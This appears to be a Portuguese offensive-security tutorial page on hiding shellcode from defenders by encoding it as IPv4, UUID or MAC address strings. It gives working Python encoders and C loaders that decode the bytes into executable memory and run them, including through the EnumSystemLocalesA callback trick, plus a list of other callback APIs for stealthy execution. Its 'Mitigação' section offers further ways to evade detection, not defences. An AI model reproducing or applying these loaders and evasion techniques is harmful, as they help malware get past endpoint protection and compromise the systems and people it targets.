---
layout: cyber
section: evasao
title: "Payload Obfuscation — Data Encoding (IPv4 / MAC / UUID)"
---

# 12. Payload Obfuscation — Data Encoding (IPv4 / MAC / UUID)

## Bytes Cifrados Como Configuração Legítima

Shellcode é sequência de bytes. Defenders olham pra arrays hex em binário como red flag automático. Reformatar os mesmos bytes como strings IPv4, endereços MAC ou UUIDs quebra assinatura por padrão de array hex e parece configuração legítima (firewall whitelist, COM CLSIDs, MAC allow-list). WinAPI fornece parsers nativos pra converter essas strings de volta em bytes — sem código custom de decode visível ao analista.

---

## Formatos Disponíveis e APIs Nativas

### IPv4 Obfuscation

Cada IPv4 = 4 bytes (`A.B.C.D` → byte A, byte B, byte C, byte D). Shellcode de N bytes → ceil(N/4) IPs.

WinAPI: `RtlIpv4StringToAddressA` em `ntdll.dll` parsa string `"127.0.0.1"` em DWORD.

### IPv6 Obfuscation

Cada IPv6 = 16 bytes. Mais denso (1 string = 16 bytes). `RtlIpv6StringToAddressA`.

### MAC Address Obfuscation

Cada MAC = 6 bytes (`AA-BB-CC-DD-EE-FF`). WinAPI: `RtlEthernetStringToAddressA`.

### UUID Obfuscation

Cada UUID = 16 bytes (`{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}`). WinAPI: `UuidFromStringA` em `rpcrt4.dll`.

---

## Na Prática

### 1. IPv4 Obfuscation

#### Encode-time (Python helper):

```python
def shellcode_to_ipv4_array(shellcode):
    # Pad to multiple of 4
    pad = (4 - len(shellcode) % 4) % 4
    shellcode += b"\x90" * pad  # NOP padding
    ips = []
    for i in range(0, len(shellcode), 4):
        chunk = shellcode[i:i+4]
        ips.append(f"{chunk[0]}.{chunk[1]}.{chunk[2]}.{chunk[3]}")
    return ips

ips = shellcode_to_ipv4_array(open("payload.bin","rb").read())
# Output C array
print('char* IpArray[] = {')
for ip in ips: print(f'    "{ip}",')
print('};')
```

#### Decode-runtime (C):

```c
#include <winternl.h>
#include <stdio.h>

// Forward declaration (ntdll export)
NTSYSAPI NTSTATUS NTAPI RtlIpv4StringToAddressA(
    PCSTR S, BOOLEAN Strict, PCSTR* Terminator, IN_ADDR* Addr);

LPVOID DeobfuscateIpv4(char** ips, size_t count, SIZE_T* pOutSize) {
    SIZE_T size = count * 4;
    LPVOID pAlloc = VirtualAlloc(NULL, size,
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_EXECUTE_READWRITE);
    PBYTE pCursor = (PBYTE)pAlloc;
    PCSTR pTerm;
    IN_ADDR addr;

    for (size_t i = 0; i < count; i++) {
        RtlIpv4StringToAddressA(ips[i], FALSE, &pTerm, &addr);
        memcpy(pCursor, &addr.S_un.S_addr, 4);
        pCursor += 4;
    }

    *pOutSize = size;
    return pAlloc;
}

int main() {
    char* IpArray[] = {
        "252.72.131.228",   // 0xfc 0x48 0x83 0xe4
        "240.232.200.0",    // 0xf0 0xe8 0xc8 0x00
        /* ... */
    };
    SIZE_T sSize;
    LPVOID pShell = DeobfuscateIpv4(IpArray, _countof(IpArray), &sSize);
    ((void(*)())pShell)();
}
```

**Vantagem**: array de strings IP parece config de firewall/whitelist. Yara teria que reconhecer padrão "array de IPs que decodifica para shellcode" — não trivial.

### 2. UUID Obfuscation

Mais denso (16 bytes/UUID vs 4 bytes/IP).

#### Encode-time:

```python
import uuid
def shellcode_to_uuids(shellcode):
    pad = (16 - len(shellcode) % 16) % 16
    shellcode += b"\x90" * pad
    uuids = []
    for i in range(0, len(shellcode), 16):
        uuids.append(str(uuid.UUID(bytes_le=shellcode[i:i+16])))
    return uuids
```

#### Decode-runtime:

```c
#include <rpc.h>
#pragma comment(lib, "rpcrt4")

LPVOID DeobfuscateUuid(const char** uuids, size_t count, SIZE_T* pOut) {
    SIZE_T size = count * 16;
    LPVOID pAlloc = HeapAlloc(GetProcessHeap(), 0, size);
    PBYTE pCursor = (PBYTE)pAlloc;
    UUID uuid;

    for (size_t i = 0; i < count; i++) {
        UuidFromStringA((RPC_CSTR)uuids[i], &uuid);
        memcpy(pCursor, &uuid, 16);
        pCursor += 16;
    }

    *pOut = size;

    // Tornar executável
    DWORD dwOld;
    VirtualProtect(pAlloc, size, PAGE_EXECUTE_READ, &dwOld);
    return pAlloc;
}
```

### 3. MAC Address Obfuscation

```c
#include <iphlpapi.h>
#pragma comment(lib, "iphlpapi")

NTSYSAPI NTSTATUS NTAPI RtlEthernetStringToAddressA(
    PCSTR S, PCSTR* Terminator, DL_EUI48* Addr);

// Cada MAC = 6 bytes (alinhar shellcode em múltiplo de 6)
```

### 4. EnumSystemLocalesA — Callback Trick

Variação criativa: `EnumSystemLocalesA` aceita callback `LOCALE_ENUMPROCA`. Apontar callback para shellcode obfuscado em qualquer formato (após deobfuscation).

```c
LPVOID pShellcode = DeobfuscateUuid(/* ... */);
EnumSystemLocalesA((LOCALE_ENUMPROCA)pShellcode, LCID_SUPPORTED);
// API chama shellcode como callback de cada locale; primeira call = exec
```

**Por que isso é stealth**: `CreateThread`/`VirtualAlloc + jmp` são triggers EDR. Callback indireto via WinAPI legítima é menos suspeito.

---

## Outras WinAPIs com Callbacks Úteis

| API | Callback type | Uso |
|-----|--------------|-----|
| `EnumSystemLocalesA` | LOCALE_ENUMPROCA | Trigger via locale enum |
| `EnumChildWindows` | WNDENUMPROC | Trigger via window enum |
| `EnumFontsA` | FONTENUMPROCA | Trigger via font enum |
| `EnumThreadWindows` | WNDENUMPROC | Trigger thread-scoped |
| `EnumResourceTypesA` | ENUMRESTYPEPROCA | Trigger via resource enum |
| `EnumDesktopWindows` | WNDENUMPROC | Trigger desktop-scoped |

Combine **data obfuscation** (IPv4/UUID/MAC) **com callback trigger** = nenhuma chamada óbvia de exec.

---

## Detecção

- **String inspection**: array de IPs/UUIDs em binário sem uso aparente é red flag fraco.
- **Sequence analysis**: muitos UUIDs em sucessão pode ser detectado por modelo ML treinado.
- **Runtime memory scan**: após decode, buffer contém shellcode legível — pe-sieve detecta.
- **API call sequence**: `RtlIpv4StringToAddressA` + `VirtualAlloc(RWX)` em sucessão = hook EDR captura.

## Mitigação

- Dispersar decode pelo binário (não em loop único).
- Decode em chunks com pausas (`Sleep`/spurious computation).
- Combinar com **payload encryption** (`11_payload_encryption.md`) — UUIDs decodificam para ciphertext, não shellcode bruto.

## Leitura Complementar

- @ChoiSG — Encoding shellcode via UUID strings
- MITRE T1027 — Obfuscated Files
